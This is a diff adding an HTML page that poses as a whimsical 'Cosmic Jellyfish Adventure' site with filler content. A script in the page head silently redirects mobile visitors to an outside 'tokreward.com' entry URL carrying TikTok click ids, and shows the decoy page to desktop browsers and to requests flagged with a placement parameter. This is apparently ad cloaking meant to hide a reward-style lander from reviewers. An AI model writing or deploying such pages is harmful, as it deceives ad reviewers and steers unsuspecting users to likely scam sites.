@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventure</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: rgba(255, 255, 255, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 20px;
+            color: #fff;
+            transform: skew(-5deg);
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+        }
+        a {
+            color: #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to the Cosmic Jellyfish Adventure</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Neon Tentacles</h2>
+            <p>Explore the bioluminescent wonders of deep space jellyfish!</p>
+        </div>
+        <div class="card">
+            <h2>Gravity-Defying Dance</h2>
+            <p>Learn the art of zero-gravity jellyfish ballet.</p>
+        </div>
+        <div class="card">
+            <h2>Stardust Cuisine</h2>
+            <p>Taste the flavors of the cosmos in our jellyfish-inspired dishes.</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Jellyfish Adventure | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
